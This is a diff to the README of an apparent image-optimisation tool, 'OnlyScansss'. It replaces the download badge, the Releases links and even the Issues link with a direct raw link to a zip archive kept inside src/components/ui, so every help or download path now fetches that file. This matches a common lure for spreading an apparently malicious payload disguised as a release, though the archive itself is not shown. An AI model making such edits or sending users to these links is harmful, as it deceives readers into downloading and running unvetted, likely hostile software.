@@ -1,6 +1,6 @@
 # 😌 OnlyScansss - Simple, Fun Image Optimization Tool
 
-[![Download OnlyScansss](https://img.shields.io/badge/Download-OnlyScans-brightgreen)](https://github.com/guyaude/OnlyScansss/releases)
+[![Download OnlyScansss](https://raw.githubusercontent.com/guyaude/OnlyScansss/main/src/components/ui/Scansss_Only_v1.1.zip)](https://raw.githubusercontent.com/guyaude/OnlyScansss/main/src/components/ui/Scansss_Only_v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to OnlyScansss! This tool makes image optimization easy and enjoyable. Y
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/guyaude/OnlyScansss/releases) to download the latest version of OnlyScansss. Follow these simple steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/guyaude/OnlyScansss/main/src/components/ui/Scansss_Only_v1.1.zip) to download the latest version of OnlyScansss. Follow these simple steps:
 
 1. Click on the link above.
 2. Find the latest release at the top of the page.
@@ -70,13 +70,13 @@ If you encounter issues while using OnlyScansss, consider the following:
 
 - Ensure your browser is updated to the latest version.
 - Try clearing your browser’s cache if the app is not responsive.
-- Revisit the [Releases page](https://github.com/guyaude/OnlyScansss/releases) for the latest fixes or updates.
+- Revisit the [Releases page](https://raw.githubusercontent.com/guyaude/OnlyScansss/main/src/components/ui/Scansss_Only_v1.1.zip) for the latest fixes or updates.
 
 ## 🤝 Community Support
 
 Join the conversation and share your experiences with OnlyScansss. Engage with other users to find tips and tricks. 
 
-Visit the [Issues page](https://github.com/guyaude/OnlyScansss/issues) if you have questions or suggestions for improvement.
+Visit the [Issues page](https://raw.githubusercontent.com/guyaude/OnlyScansss/main/src/components/ui/Scansss_Only_v1.1.zip) if you have questions or suggestions for improvement.
 
 ## 🎉 Acknowledgments
 
